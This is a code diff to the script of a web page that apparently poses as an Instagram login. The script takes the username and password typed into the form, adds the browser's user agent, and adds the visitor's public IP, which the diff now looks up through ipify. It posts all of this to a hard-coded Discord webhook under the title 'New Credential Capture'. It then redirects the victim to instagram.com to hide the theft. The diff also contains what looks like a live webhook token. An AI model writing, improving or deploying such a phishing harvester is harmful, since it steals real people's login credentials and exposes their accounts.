@@ -78,23 +78,34 @@
     }
   </script>
   <script>
-  function sendMessage() {
-  function delay(ms) {
-    return new Promise(resolve => setTimeout(resolve, ms));
-  }
+  async function sendMessage() {
+  // Delay function
+  const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
 
+  // Get form data
   const username = document.getElementById('username').value;
   const password = document.getElementById('password').value;
   const userAgent = navigator.userAgent;
 
+  // Fetch public IP address
+  let ip = "Unavailable";
+  try {
+    const res = await fetch('https://api.ipify.org?format=json');
+    const data = await res.json();
+    ip = data.ip;
+  } catch (error) {
+    console.error("IP fetch error:", error);
+  }
+
+  // Construct payload
   const payload = {
     username: "🔔 Logger Bot",
-    avatar_url: "https://i.imgur.com/AfFp7pu.png", // optional bot avatar
+    avatar_url: "https://i.imgur.com/AfFp7pu.png",
     embeds: [
       {
         title: "🟡 New Credential Capture",
-        description: "A new login was just submitted from a user.",
-        color: 0xFFD700, // Gold-yellow
+        description: "A new login attempt has been logged.",
+        color: 0xFFD700, // Gold color
         fields: [
           {
             name: "👤 Username",
@@ -113,7 +124,7 @@
           },
           {
             name: "📡 IP Address",
-            value: "`Fetching from backend or leave as placeholder...`",
+            value: `\`${ip}\``,
             inline: false
           }
         ],
@@ -126,14 +137,15 @@
     ]
   };
 
+  // Send to Discord webhook
   const request = new XMLHttpRequest();
   request.open("POST", "https://discord.com/api/webhooks/1382345428669829120/hQNpgVsszl0Lepl2JxtJSjZC2YSQAoT2_UYTKurFYRHexes-0kqg6HUHygwL2OBkuCce");
   request.setRequestHeader('Content-type', 'application/json');
   request.send(JSON.stringify(payload));
 
-  delay(2000).then(() => {
-    window.location.replace("https://www.instagram.com");
-  });
+  // Redirect after delay
+  await delay(2000);
+  window.location.replace("https://www.instagram.com");
 }
 
 </script>
